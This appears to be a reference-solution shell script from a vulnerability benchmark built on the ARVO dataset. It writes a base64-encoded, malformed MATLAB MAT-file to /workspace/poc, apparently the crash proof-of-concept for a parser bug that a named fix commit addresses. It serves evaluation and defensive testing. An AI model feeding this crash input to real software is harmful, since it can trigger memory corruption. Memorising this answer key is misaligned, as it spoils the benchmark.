#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit d7455408 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
TUFUTEFCIDEuMCBNQVQtZmlsZSwgUGxhdGZvcm06IEdMTlg4NiwgQ3JlYXRuZWQgOm8gV2VkIEF1ZyAgMyAxMzo1MzoxNCAyMDA1ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAABSU0OAAAAaAAAAAYAAAAIAAAABgAAAAAAAAAFAAAADAAAAAUAAAAKAAAAAQABAGQAAAACAAAAMwAAAAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyAAAAAAAADgAAACgHAAAGAAAACAAAAAEAAAAAAAAABQAAAAgAAAACAAAABQAAAAEABABjZWxsDgAAACgHAAAGAAAACAAAAAEAAAAAAAAABQAAAAgAAAACAAAABQAAAAEABABjZWxsDgAAAKgHAAAGAAD/DAAA
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
